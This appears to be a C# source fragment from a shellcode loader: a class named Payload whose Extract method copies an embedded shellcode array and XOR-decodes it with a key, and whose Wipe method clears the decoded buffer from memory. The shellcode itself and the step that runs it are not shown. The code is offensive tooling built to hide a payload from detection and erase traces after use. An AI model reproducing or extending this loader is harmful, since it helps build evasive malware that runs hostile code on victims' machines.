using System;

static class Payload
{
    internal static byte[] Extract()
    {
        byte[] buf = new byte[SC.shellcode.Length];
        Buffer.BlockCopy(SC.shellcode, 0, buf, 0, buf.Length);

        for (int i = 0; i < buf.Length; i++)
            buf[i] ^= SC.key[i % SC.key.Length];

        return buf;
    }

    internal static void Wipe(byte[] buf)
    {
        Array.Clear(buf, 0, buf.Length);
    }
}
